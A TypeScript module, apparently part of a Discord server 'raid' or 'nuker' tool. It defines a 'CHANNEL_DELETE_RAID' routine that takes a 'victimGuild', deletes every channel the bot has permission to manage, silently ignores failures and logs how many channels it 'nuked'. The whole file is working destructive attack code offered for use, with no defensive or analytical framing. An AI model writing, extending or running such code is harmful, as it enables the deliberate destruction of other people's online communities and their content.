import chalk from 'chalk'
import { Raid } from './../typings/index.js'
import { Log, spinner } from './../utils/index.js'

const channelDeleteRaid: Raid = {
	name: 'CHANNEL_DELETE_RAID',
	id: 1,
	permission: 'MANAGE_CHANNELS',
	async execute(victimGuild) {
		const _spinner = spinner(`Nuking channel: `).start()
		let nukedCount = 0

		// Well if you cant fetch permissions, you prolly dont have them, lol
		const victimChannels = victimGuild.channels.cache.filter(
			channel =>
				channel
					.permissionsFor(victimGuild.client.user?.id as string)
					?.has('MANAGE_CHANNELS') ?? false
		)

		for (const victimChannel of victimChannels.values())
			try {
				_spinner.text = `Nuking channel: ${victimChannel.name}`
				await victimChannel.delete()
				nukedCount++
			} catch (error) {} // Digest all errors... nom nom nom

		_spinner.stop()
		Log.success(`Nuked ${chalk.bold(`${nukedCount} channels`)}`)
	},
}

export default channelDeleteRaid
